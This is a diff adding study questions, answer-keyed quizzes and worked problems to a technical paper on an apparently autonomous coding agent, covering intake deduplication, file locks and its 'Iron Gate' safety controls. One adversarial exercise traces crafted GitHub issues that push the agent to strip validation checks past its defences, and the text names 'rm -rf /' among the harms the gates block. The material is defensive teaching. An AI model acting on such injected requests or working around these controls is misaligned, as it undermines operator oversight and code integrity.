+<p>Refinement 14 guards a shared working tree: two operations read and write the same files, and a candidate built on an old read can overwrite a newer change. The October path changes that setting. Each operation executes in its own worktree on <code>ouroboros/auto/&lt;session&gt;-&lt;nonce&gt;</code>, so concurrent operations no longer write to the same files on disk. Stale state then shows up at integration time instead: landings are combined on the accumulation branch and promoted to <code>main</code> fast-forward only (§93.7). A fast-forward refuses to go ahead if <code>main</code> has moved in a way that would need a merge, so divergence cannot be silently overwritten there.</p>
+<p>§93.2 adds a related but different guarantee. The two-phase commit means a write is claimed only after the bytes on disk are checked with SHA-256. That catches the phantom <code>written=True</code> class, a write that never actually happened. It does not catch a write built on stale input. These are three checks with three different questions: was the input current (Refinement 14), did the write happen (§93.2), and can the result integrate cleanly (fast-forward promotion).</p>
+<p>A fair position is that Refinement 14 is still useful but no longer the main defence. Inside one worktree it still catches a candidate whose GENERATE-time read differs from the APPLY-time file, for example when a multi-file operation edits a file it read earlier. The evidence that would settle whether it can be retired is how often its warning fires per soak under worktree execution. If that count is near zero across long soaks, the isolation has made it redundant. If it fires, it is catching something promotion would only find later.</p>
+</details>
+<details class="cq-adv"><summary>A3. §53 argues that "structural fixes outperform configurational patches," and that most refinements changed the architecture. Test that claim against the §52 table itself and against what §93 found about mechanisms that existed but did nothing.</summary>
+<p>Against the table, the claim is only partly supported. Four of the twelve refinements are listed in the table by an environment variable (R11 <code>JARVIS_FILE_LOCK_TTL_S</code>, R15 <code>JARVIS_COALESCE_WINDOW_S</code>, R17 <code>JARVIS_NOTIFY_APPLY_DELAY_S</code>, R19 <code>JARVIS_MAX_EXPLORATION_ROUNDS</code>), and R12's text in §52.5 adds a fifth, <code>JARVIS_MIN_EXPLORATION_CALLS</code>. Each of these still adds a mechanism, though: a TTL, a merge window, a delay, a cap. The env var tunes it rather than replacing it. R13 is the odd one out. Its "fix" is a comment saying an <code>asyncio.Lock</code> would be needed under multi-threading (§52.6), which is documentation, not structure. R14 is structural but soft. A fair reading is that most refinements add structure, and §53 overstates how cleanly they divide.</p>
+<p>§93 adds a sharper point: structure is necessary but not sufficient. §93.8 found that VALIDATE's repair rungs "had existed before" but were inert. There were 524 byte-identical retry iterations re-validating a frozen pool, and 532 micro-fix runs with zero repairs. §93.12 found 131 features "DARK": flag on, module on disk, nothing in production importing it. Refinement 10 (§52.3) is itself an early example: the L2 repair mechanism existed, but its output never reached disk.</p>
+<p>So the lesson in §53 needs a third clause. A structural fix counts only once it is shown to be reached and to have an effect in a live run. That is exactly what the reachability ledger (registered, then invoked, then effective) and <code>/reach</code> were built to measure (§93.12). The evidence that settles any one refinement is its "effective" count from a live soak, not the presence of the code.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (research).</strong> Refinement 18 (§52.11, §49.4) compares the success rate "before and after the first lesson was recorded," every 10 post-lesson operations, and clears the buffer if the post-lesson rate is lower. §49 says every operation produces a lesson, success or failure. Work out how many operations the "before" window can contain in a sequential session. Then estimate the noise in a 10-operation success rate when the true rate is 0.5. Frame an experiment that tests whether the metric clears lessons for the right reason. Give the hypothesis, metric, control, and the result that would falsify it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>If the first operation to finish records a lesson, how many operations finished before the first lesson? For the noise, use the standard error of a proportion, the square root of p(1 − p)/n.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>The "before" window.</strong> §49 says every operation produces a success or failure lesson, and §49.3 still records infra failures (it only excludes them from injection). In a sequential session, the first operation to finish records the first lesson, so the "before" window holds one operation. Its success rate is 0% or 100%. Concurrency could put a few operations in it, but the window stays tiny. This assumes the counters are not reset elsewhere. The paper does not say, so state it as an assumption.</p>
+<p><strong>The consequence.</strong> If the first operation succeeded, the baseline is 100%, so any post-lesson window with even one failure is "lower" and the buffer is cleared at the first check. If the first operation failed, the baseline is 0% and the buffer can never be cleared. The verdict is decided mostly by the outcome of one operation, not by what the lessons did.</p>
+<p><strong>The noise.</strong> For n = 10 and p = 0.5, the standard error is the square root of 0.25/10, about 0.158. Two windows with the same true rate will often differ by 15 to 30 percentage points by chance. A single operation moves a 10-operation rate by 10 points.</p>
+<p><strong>The experiment.</strong></p>
+<ul>
+<li><em>Hypothesis H1:</em> buffer clears under Refinement 18 are predicted by the first operation's outcome and are not associated with a real drop caused by lessons.</li>
+<li><em>Metric:</em> for each session, whether a clear occurred, the first operation's outcome, and the VALIDATE pass rate of operations with lessons injected against operations with them withheld.</li>
+<li><em>Control:</em> within each session, withhold lesson injection from a random half of eligible operations. Run the metric on both arms, so a clear can be compared with an actual difference between the arms.</li>
+<li><em>Falsification:</em> H1 is falsified if clears happen about equally often after a successful and after a failed first operation, and sessions with clears show a real gap where injected operations do worse than withheld ones.</li>
+</ul>
+<p><strong>A proposal (not in the paper).</strong> If H1 holds, replace the single-operation baseline with the withheld arm running alongside, and require a minimum sample before any clear. To check the derivation, simulate sessions with lessons that have no effect at p = 0.5. Under the rule as specified, about half the sessions should clear at the first check, because a successful first operation sets a 100% baseline and a 10-operation window at 0.5 almost never reaches 100%.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (systems design).</strong> Redesign Refinement 19 (an exploration cap of 5 rounds, §52.12) for the October hardware: one RTX 5090, no paid lanes, 32,768 tokens of context, prefill about 6.5k tok/s, decode p50 172 tok/s (§93.6). Assume a base prompt of 12,000 tokens. Assume each <code>read_file</code> returns about 3,000 tokens, <code>git_log</code> 800, <code>get_callers</code> 500 and <code>glob_files</code> 300. Assume about 60 tokens of decode per tool call and a 1,500-token diff answer. Check time and context for an <code>architectural</code> operation, which needs 4 categories including call_graph and history (§47.3), on the 180 s COMPLEX budget (§42.5). Find the binding constraint and propose a cap that respects it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Compute wall time and context separately. One of them has far more slack than the other. Then ask what happens if the model spends its five rounds on full-file reads.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>The minimal compliant path.</strong> One call per category: <code>read_file</code> (COMPREHENSION, 3,000), <code>glob_files</code> (DISCOVERY, 300), <code>get_callers</code> (CALL_GRAPH, 500), <code>git_log</code> (HISTORY, 800). Tool results come to 4,600 tokens. The prompt then holds 12,000 + 4,600 = 16,600 tokens, which leaves about 16,200 for the answer. That is four rounds, inside the cap of 5. Whether it clears the score of 14.0 depends on weights the paper does not publish, so a fifth call may be needed.</p>
+<p><strong>Time.</strong> Prefill: in the worst case, with no KV reuse, each round re-reads the whole prefix. Five rounds at about 12,000 to 16,600 tokens each is under about 75,000 tokens, which at 6.5k tok/s is about 11.5 s. Decode: 5 calls × 60 tokens = 300 tokens, about 1.7 s, plus the 1,500-token diff, about 8.7 s. The total is roughly 22 s, well inside 180 s. Time is not the binding constraint.</p>
+<p><strong>Context.</strong> Now suppose the model spends all five rounds on full-file reads: 5 × 3,000 = 15,000 tokens of results. The prompt is then 27,000, which leaves about 5,800 tokens for output. A 1,500-token diff still fits. A whole-file answer does not. §93.11 found that 86% of training prompts asked for whole-file rewrites that "cannot fit the completion window," and §93.14 item 3 reports 219 whole-file answers against 6 diffs in the 10-09 soak. Context is the binding constraint, and a round count does not measure it. Five small calls and five large reads both count as "5".</p>
+<p><strong>Proposed design (not in the paper).</strong></p>
+<ol>
+<li>Reserve the completion window first. For example, keep 8,000 tokens for the answer, and let the exploration budget be the context minus the base prompt minus that reserve: 32,768 − 12,000 − 8,000, or about 12,700 tokens.</li>
+<li>Cap exploration in tokens, not rounds. When the next result would exceed the budget, return a truncated or symbol-scoped view instead. §93.6 shows a signed <code>target_symbol</code> cut generation scope from about 126,600 tokens to about 750.</li>
+<li>Make the cap and the floor consistent. Tool masking forces tool calls until the minimum is met (§93.6). If duplicates earn zero credit (§47.3), a model can hit the cap while still below the floor and then be rejected on retry. Allow the cap to extend only for calls that cover a still-missing required category.</li>
+<li>Keep the §52.12 nudge ("produce your final code change now") when the token budget is spent.</li>
+</ol>
+<p><strong>Justification and check.</strong> This keeps Principle 3 (no polling) and the Iron Gate untouched, adds no paid lane, and targets the failure §93.14 names as the leading cause of death. To check it, recompute with your own token sizes. The design is right if the reserved answer window survives in the worst case: (base + exploration budget + reserve) must not exceed 32,768.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -2563,6 +3929,16 @@ Each layer is orthogonal; they compose. An event that a sensor decides is action
 
 Each sensor fans out per registered repo when `repo_registry` is set; falls back to a single "jarvis" sensor otherwise. This means: in a multi-repo deployment, each repo has its own TestFailureSensor instance watching its own `test_results.json`, its own OpportunityMinerSensor scanning its own `*.py` files. Cross-repo drift is detected separately by `CrossRepoDriftSensor`.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-ix-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">A signal has survived the event spine's debouncing and fingerprinting and a sensor has turned it into a <code>SignalEnvelope</code>. What questions do you think the final gate must still ask before the envelope may reach the pipeline?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>The <code>UnifiedIntakeRouter</code> asks four: is it a duplicate of a recent signal (<code>dedup_key</code>), does it conflict with a file already under operation (<code>file_lock</code>), what is its priority score, and can it be coalesced with a recent similar envelope (<code>coalesce_window</code>). The output is a sorted priority queue with conflicts and coalescing already applied. See §56.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §56. UnifiedIntakeRouter
 
 **Source:** `unified_intake_router.py`.
@@ -2589,6 +3965,159 @@ WAL entries are cleared when an envelope transitions to `dispatched` (the pipeli
 ### §56.3 Cross-Session Coalescing Guard (Session N)
 
 An early bug (Session N, 2026-04-15): WAL replay on a new session could merge stale envelopes with fresh ones, producing a coalesced operation where half the envelopes were from a previous crashed session. Fix: cross-session coalescing is now guarded by session-id — envelopes from different sessions do not coalesce. State cleanup: `rm .jarvis/intake_wal.jsonl && rm .jarvis/intake_router.lock` before each session.
+
+<!-- engage:begin -->
+#### Check your understanding: PART IX — The Intake Layer
+
+<div class="engage" id="engage-part-ix">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does the intake layer use four separate storm-protection layers instead of one strong deduplicator?</summary>
+<p>Each layer sits at a different stage and catches a different kind of repeat. <code>FileWatchGuard</code> absorbs bursts of file saves with a 0.3s debounce, checksums and an LRU cache; the <code>TrinityEventBus</code> drops identical events from many producers with a 60s SHA-256 fingerprint window; <code>TestFailureSensor</code> waits 2s before spawning pytest; and the router's envelope <code>dedup_key</code> stops duplicate operations. The paper calls the layers orthogonal: they compose, so an actionable event has already passed at least two of them. One deduplicator at the end would let every burst travel through the bus and spawn pytest runs before it was suppressed. See §55.2.</p>
+</details>
+<details class="cq"><summary>2. The intake layer is push-based, yet every sensor keeps <code>scan_once()</code> and its poll loop. Is that a contradiction?</summary>
+<p>No. Push is the primary path because it gives low latency: producers publish to the event spine immediately and sensors subscribe (Manifesto §3). The poll loops are kept as safety nets for when the event spine is unavailable, and <code>scan_once()</code> serves manual or CLI use. So push makes the common case fast, and polling makes sure detection still works when the push path fails. See §54 and §55.</p>
+</details>
+<details class="cq"><summary>3. The WAL exists for disaster recovery, but it also caused a bug. What was the bug, and what does the fix teach about recovery mechanisms?</summary>
+<p>The WAL in <code>.jarvis/intake_wal.jsonl</code> is replayed on restart so a crashed harness does not lose pending work. In Session N, replay put stale envelopes from a crashed session beside fresh ones, and coalescing merged them into one operation, half of it from the old session. The fix guards coalescing by session id, so envelopes from different sessions never merge, and stale entries are pruned by TTL. The lesson is that recovered state needs its origin recorded. Otherwise the recovery path quietly mixes old intent with new. See §56.2, §56.3 and §63.1.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-ix">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. Which storm-protection layer removes duplicates using a SHA-256 fingerprint over a 60-second window?</p>
+<ol class="mcq-options" type="A">
+<li><code>FileWatchGuard</code></li>
+<li><code>TestFailureSensor</code></li>
+<li><code>TrinityEventBus</code></li>
+<li><code>IntakeRouter</code></li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The TrinityEventBus does SHA-256 fingerprint dedup with a 60s window. FileWatchGuard debounces and checksums, TestFailureSensor debounces before spawning pytest, and the router uses <code>dedup_key</code>. See §55.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. The 16-slot priority queue is full and a new envelope arrives. What does the paper say happens?</p>
+<ol class="mcq-options" type="A">
+<li>The new envelope is rejected and permanently discarded</li>
+<li>The oldest envelope is evicted regardless of priority</li>
+<li>The queue grows past 16 slots until the pipeline catches up</li>
+<li>The lowest-priority envelope is evicted and logged, and may come back later</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> When the queue is full, the lowest-priority envelopes are evicted and logged. They can be re-ingested if the sensor fires again. See §56.1.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. When is an envelope's entry cleared from the intake WAL?</p>
+<ol class="mcq-options" type="A">
+<li>When the envelope transitions to <code>dispatched</code></li>
+<li>When the operation's commit is written by the AutoCommitter</li>
+<li>When the envelope is first written to the priority queue</li>
+<li>Only when the operator deletes the file by hand</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> WAL entries are cleared when the pipeline picks the envelope up, that is, when it transitions to <code>dispatched</code>. Stale entries from crashed sessions are pruned by TTL. See §56.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. In a deployment where <code>repo_registry</code> is not set, how are sensors instantiated?</p>
+<ol class="mcq-options" type="A">
+<li>One sensor per repo found on disk under the workspace</li>
+<li>A single "jarvis" sensor of each kind</li>
+<li>No sensors start until a registry is configured</li>
+<li>Only <code>CrossRepoDriftSensor</code> runs, covering all repos</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Sensors fan out per registered repo when <code>repo_registry</code> is set. Otherwise each falls back to a single "jarvis" sensor. Cross-repo drift is handled separately by CrossRepoDriftSensor. See §55.3.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-ix">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> A developer saves a <code>.py</code> file twice within 0.2 seconds, and the change breaks a test. Trace the signal from the file save to a queued envelope. Name each component it passes and say which storm-protection layer acts at each step.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Follow the producer column of the event-spine diagram, then the four numbered storm layers, then the router's four questions.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The save is seen by <code>FileWatchGuard</code> (watchdog), via the Phase 1 <code>FileSystemEventBridge</code>. Its 0.3s debounce and checksum dedup fold the two saves into one change (layer 1). It publishes an <code>fs.changed.*</code> event to the TrinityEventBus, which drops any identical fingerprint seen within 60s (layer 2).</p>
+<p><code>TestFailureSensor</code> subscribes to debounced <code>.py</code> changes and waits 2s before spawning pytest (layer 3). The pytest plugin writes <code>.jarvis/test_results.json</code>, and the sensor emits a <code>SignalEnvelope</code> for the failure.</p>
+<p>The <code>UnifiedIntakeRouter</code> checks the <code>dedup_key</code> (layer 4) and the file lock, scores priority, and checks whether to coalesce. It then places the envelope in the 16-slot priority queue, which is persisted to <code>.jarvis/intake_wal.jsonl</code>. See §54, §55.1, §55.2 and §56.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A teammate says: "The paper tells us to <code>rm .jarvis/intake_wal.jsonl</code> before every session anyway, so let us delete the WAL entirely and keep the queue only in memory." Evaluate the proposal using the paper's reasons for the WAL and its account of the Session N bug.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask which problem the WAL solves and which problem the cleanup step solves. Are they the same problem?</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The WAL is disaster recovery. When a harness crashes, replaying the log rehydrates the queue so pending work is not lost (§56.2). An in-memory queue would lose every pending envelope on a crash.</p>
+<p>The cleanup step and the Session N bug are a different problem. Replay merged stale envelopes into fresh operations through coalescing (§56.3, §63.1). The structural fix is the session-id guard on coalescing, plus TTL pruning of stale entries. Neither requires removing the log.</p>
+<p>So the proposal trades a real recovery guarantee for a problem that is already solved more narrowly. A better position is to keep the WAL and keep the session guard, and treat the manual cleanup as a clean-start step for controlled test sessions.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code> and find <code>_dedup_window_s</code> and <code>_is_duplicate</code>. Which envelope source gets a different window? What are the two default window lengths in the router's config? What window value turns deduplication off? Relate this to storm-protection layer 4 in §55.2.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Search the file for <code>voice_dedup_window_s</code>. The config dataclass declares both defaults next to each other.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><code>_dedup_window_s</code> returns <code>voice_dedup_window_s</code> when <code>envelope.source == "voice_human"</code>, and <code>dedup_window_s</code> otherwise. The config defaults are 300.0 seconds for voice and 600.0 seconds for everything else.</p>
+<p><code>_is_duplicate</code> returns False when the window is 0 or less, so a zero window disables deduplication. Otherwise it looks up the last monotonic time recorded for the envelope's <code>dedup_key</code> and reports a duplicate if that time falls inside the window.</p>
+<p>This is layer 4 of §55.2, "envelope <code>dedup_key</code> prevents duplicate operations." The code adds one detail the paper does not state: the window is shorter for human voice commands than for sensor-generated signals.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. The 16-slot queue evicts its lowest-priority envelope and says it "may be re-ingested if the sensor fires again." In a push-based intake layer, when could an eviction quietly become permanent, and why does that matter more after §93's supply wall?</summary>
+<p>Eviction is only temporary if the sensor fires again (§56.1). Under the push model, most sensors fire on events: <code>OpportunityMinerSensor</code> and <code>TodoScannerSensor</code> react to <code>fs.changed.*</code> on <code>*.py</code>, and <code>DocStalenessSensor</code> reacts to file changes and <code>git_events.json</code> (§54). The poll loops are kept only as safety nets "when the event spine is unavailable" (§54). So if a file never changes again while the spine is healthy, an evicted signal about it has no path back except a manual <code>scan_once()</code>.</p>
+<p>The priority formula tends to push these sources to the bottom of the queue. In §50.2, <code>opportunity_miner</code> and <code>doc_staleness</code> sit at source tiers 5 and 6, and with a file-count penalty and no urgency boost (§50.1) they are the likeliest to be evicted. The loss is therefore concentrated on the low-urgency improvement work. In April that looked like an acceptable cost. In October, §93.10 reports a supply wall: after about four hours, yield is bounded by the supply of landable work, not by the model. A queue that silently drops candidate work makes the binding constraint worse.</p>
+<p>My position is that eviction should stay, since a bounded queue is a storm defence, but it should be paired with a re-scan of what was evicted once the queue drains. The evidence that would settle it: per-source eviction counts from the eviction log, set against the share of those evicted files that were later re-ingested. A low re-ingest rate for event-driven sources would show the loss is real.</p>
+</details>
+<details class="cq-adv"><summary>A2. Gate 12 force-releases any file lock older than 300s (§58.12). Combine that with the operation durations in Part XI. What can happen if an operation is slow but not crashed, and which later gate notices?</summary>
+<p>The TTL assumes that a lock older than 300s belongs to a crashed operation (§58.12 and Refinement #11). Part XI shows that healthy operations routinely run far longer. Session W's op ran from its VALIDATE iteration at 16:14:18 to its last DECISION at 16:23:02, more than 500s (§65.4). L2 alone is now given a fresh 600s timebox, and Session L raised the complex worker ceiling to 1800s (§63.1).</p>
+<p>So a slow, healthy op can lose its lock partway through. The router's <code>file_lock</code> check then sees no conflict for that file (§56), and a second signal for the same file can dispatch a second operation. Two candidates can now be built against the same file.</p>
+<p>The only gate positioned to notice is Gate 11. It recomputes target hashes at APPLY and compares them with GENERATE-time hashes (§58.11). But a mismatch "produces a warning and ledger entry". It does not reject. The paper's design therefore detects this race and records it, but it does not prevent it. A sound fix would make the TTL longer than the longest legal operation, or have live operations renew their lock. Either is a proposal, not something the paper describes.</p>
+</details>
+<details class="cq-adv"><summary>A3. §56.3 tells the operator to delete <code>.jarvis/intake_wal.jsonl</code> before each session. Is that still a sound step once O+V runs as a long-lived daemon, as described in §93?</summary>
+<p>The manual cleanup made sense for April's battle tests. Each one was a discrete session that a human started, and Session N had just shown replay mixing stale and fresh envelopes (§63.1). By October, a bare <code>ov</code> attaches to a running organism or cold-boots one in the background (§93.9), and soaks run for hours, up to about 9 h (§93.10). One soak even ended with its VM stopped mid-run (§93.10).</p>
+<p>The cleanup step deletes exactly what the WAL exists to protect: pending work from a crashed session (§56.2). Meanwhile the structural defences against Session N are already in place. Coalescing is guarded by session id, so old and new envelopes never merge (§56.3), and stale entries are pruned by TTL (§56.2). The remaining risk is weaker: a replayed envelope still competes for dispatch on its composite score, since §50.3 scores WAL replay like any other enqueue path, even if its target has since changed.</p>
+<p>My position: retire the manual delete for daemon operation and rely on the session guard and TTL. Keep the delete only for controlled experiments that need a clean start. To settle it, count how many replayed envelopes after a crash went on to land useful work, and how many produced stale or duplicate operations.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (adversarial).</strong> The repository is public, so anyone can open GitHub issues. An adversary opens 40 issues in ten minutes. Each has a different title and body, and each asks O+V to "simplify" a different module by removing a validation check. GitHub delivers every event with a valid Standard Webhooks signature. Trace the flood through the intake layer and say which layer, if any, stops it. Then say what bounds the damage downstream, using the October pipeline in §93.7.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask what an HMAC signature actually proves, and whether any storm layer keys on something the adversary cannot vary.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Gate 10 passes every event.</strong> Gate 10 verifies HMAC-SHA256 signatures and rejects unsigned or wrongly signed webhooks (§58.10). These events really were sent by GitHub, so they pass. The signature proves the sender of the webhook, not the trustworthiness of whoever wrote the issue.</p>
+<p><strong>Storm protection does not help.</strong> The four layers suppress repeats (§55.2). <code>FileWatchGuard</code> and the TestFailureSensor debounce are not on this path. The TrinityEventBus SHA-256 fingerprint differs for each issue because each body differs. The router's <code>dedup_key</code> differs because each issue targets a different module. Coalescing only merges envelopes for the same file (§52.8), and each issue names a different one. None of these layers is a defence against distinct, well-formed requests. They were never meant to be.</p>
+<p><strong>The queue bounds the volume, not the content.</strong> At most 16 envelopes are held, and the rest are evicted by priority (§56.1). The file lock allows one operation per file (§56). That limits how fast the flood is processed. It does not decide whether any request should be done.</p>
+<p><strong>Downstream.</strong> Each surviving envelope goes through CLASSIFY, the Iron Gate and VALIDATE. Protected paths (§58.2) refuse edits to <code>.env</code>, credentials, <code>.git/</code> and supervisor core files, but an ordinary module is not protected. In the October configuration, the Sentinel auto-approves up to <code>APPROVAL_REQUIRED</code> by default. Only BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate (§93.7). So a human approval is not guaranteed to catch a weakening edit to an ordinary module. What remains is the promotion gate (provenance, coverage, no vanished public symbol) and the zero-push air-gap, which keeps anything that lands on local <code>main</code> until the operator publishes it (§93.7).</p>
+<p><strong>Conclusion.</strong> No intake layer stops this flood, and the paper does not claim one does. The damage is bounded by queue capacity, per-file locking, the gates and the air-gap. A real fix would be an intake trust rule, such as accepting issue-triggered work only from allow-listed authors or labels. That is a proposal, not a mechanism the paper describes. To check the trace, confirm that each storm layer in §55.2 deduplicates on identity, and that none of them judges intent.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (quantitative).</strong> The intake queue is full: 16 envelopes, and the lowest-priority entries are two at priority 6, one <code>opportunity_miner</code> (normal, 4 files, confidence 0.70) and one <code>doc_staleness</code> (low, 1 file, 0.85, no dependency credit). Three envelopes then arrive in order. (1) <code>doc_staleness</code>, low urgency, 1 file, confidence 0.92, no dependency credit. (2) <code>opportunity_miner</code>, high urgency, 2 files, confidence 0.95, three envelopes queued behind its file set. (3) <code>test_failure</code>, critical, 1 file, confidence 0.95, no dependency credit. Use the source tiers from §50.2 (test_failure 2, opportunity_miner 5, doc_staleness 6). Compute each new priority, decide what is evicted at each step, and name any decision the paper leaves unspecified.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Lower number means higher priority. Work out the file-count penalty bands and the confidence threshold from the §50.1 code before you add anything up.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The formula is <code>base - urgency + cost_penalty - confidence_bonus - dep_credit</code>. The urgency boost is critical 3 and high 1. The cost penalty is 0 for one file, 1 for two to four files, and 2 above that. The confidence bonus is 1 at 0.9 or above. Dependency credit is capped at 3 (§50.1).</p>
+<ol>
+<li><strong>Arrival 1:</strong> 6 - 0 + 0 - 1 - 0 = <strong>5</strong>. It outranks both priority-6 entries, so one of them is evicted. The two existing entries are tied at 6. As a check, the opportunity_miner entry is 5 - 0 + 1 - 0 - 0 = 6, the same as §50.2's signal B. <strong>The paper does not say which tied entry is evicted.</strong></li>
+<li><strong>Arrival 2:</strong> 5 - 1 + 1 - 1 - 3 = <strong>1</strong>. The remaining priority-6 entry is now the lowest, so it is evicted.</li>
+<li><strong>Arrival 3:</strong> 2 - 3 + 0 - 1 - 0 = <strong>-2</strong>, matching §50.2's signal A. The lowest remaining entry is evicted. That is either arrival 1 at 5 or some other entry, depending on the 13 entries not described.</li>
+</ol>
+<p><strong>Second-order effect.</strong> Both evicted entries came from event-driven sensors (§54). They return only if their files change again, or if someone runs <code>scan_once()</code> by hand. An evicted opportunity-miner signal also loses whatever dependency credit it might have earned later. Arrival 2 shows how much that credit is worth: 3 points, which is more than the whole gap between a normal and a critical signal in the urgency term.</p>
+<p><strong>Unspecified behaviour.</strong> The paper leaves two things open: the tie-break among equal priorities, and what happens when the newcomer itself is the lowest-priority envelope. A reasonable reading of §56.1 is that the newcomer is then the one evicted, but the text does not say so.</p>
+<p>To check the arithmetic, recompute §50.2's three rows with the same formula. You should get -2, 6 and 4.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -2723,6 +4252,16 @@ The Iron Gate is **not**:
 
 The gate does one thing: it enforces the operator's non-negotiable constraints *structurally*, outside the model's influence.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-x-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">In most autonomous-AI systems, more safety means less autonomy. After reading twelve hard gates, predict: does adding more Iron Gate rules give O+V less autonomy or more? Why?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>More. Because the gate is structural, operations that pass it do not need human approval. Default-allow tools are safe, and low-risk operations auto-apply because the gate has already vetted them. The trade-off flips: more Iron Gate means fewer approvals and so more autonomy. Approval remains only where the gate cannot decide (<code>APPROVAL_REQUIRED</code>). See §60.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §60. The Safety-Autonomy Trade-Off
 
 Most autonomous-AI systems face a trade-off: more safety → less autonomy. Strict approvals slow everything down. Strict tool-gating removes capabilities the model needs. Strict path protection breaks legitimate use cases.
@@ -2733,6 +4272,157 @@ The trade-off flips: more Iron Gate → more autonomy (because fewer operations 
 
 This is the Manifesto §6 philosophy at the deepest level. *"The Iron Gate"* is not an adversarial mechanism against the model — it is the enabling mechanism that lets the model operate with real autonomy, because the operator's non-negotiables are enforced structurally.
 
+<!-- engage:begin -->
+#### Check your understanding: PART X — The Iron Gate: Safety Philosophy
+
+<div class="engage" id="engage-part-x">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why must the Iron Gate be pre-linguistic and model-uninfluenced, rather than a careful reviewer that reads the model's reasoning?</summary>
+<p>The paper's claim is that an autonomous system is safe only if its safety layer cannot be talked out of its decisions. A gate that reads natural language can be persuaded by a well-argued rationale. The Iron Gate reads only file paths, AST nodes, tokens, exit codes and command strings, so no prompt can change its verdict. The protected-paths example makes this concrete: a model that "reasons" about why it needs to modify <code>.env</code> is still refused. Determinism and logging then make every decision repeatable and auditable. See §57 and §58.2.</p>
+</details>
+<details class="cq"><summary>2. The paper accepts that the gate will sometimes reject a valid operation. Why is that an acceptable cost?</summary>
+<p>§59 says the gate is not an oracle. False positives are acceptable because a rejected operation can be retried with different inputs. The errors the gates exist to stop are often irreversible: <code>rm -rf /</code>, a forced push to main, leaked credentials, unbounded spend. A conservative, hand-curated rule that sometimes says no costs one retry. A clever rule that sometimes says yes to the wrong thing can cost the repository. Keeping one deterministic rule per gate, with no voting and no intent reasoning, keeps each verdict predictable. See §58.3 and §59.</p>
+</details>
+<details class="cq"><summary>3. Gates 8, 9 and 12 (approval timeouts, worker ceilings, file-lock TTL) do not inspect code at all. Why do they belong in a safety inventory?</summary>
+<p>They protect liveness rather than correctness. An unanswered approval would block forever without the 600s timeout that moves it to <code>CANCELLED</code>. A wedged worker would hold a pool slot forever without the wall-clock ceiling. A crashed operation's file lock would starve every later operation on that file without the 300s TTL. Each is still a deterministic rule the model cannot override, which is the paper's definition of an Iron Gate. A safe system has to keep making progress, not only avoid bad writes. See §58.8, §58.9 and §58.12.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-x">
+<div class="mcq" data-answer="2">
+<p class="mcq-q">1. By default, how many exploration tool calls must the model make before a candidate may proceed to VALIDATE?</p>
+<ol class="mcq-options" type="A">
+<li>One</li>
+<li>Two</li>
+<li>Five</li>
+<li>None, unless the ledger is enabled</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
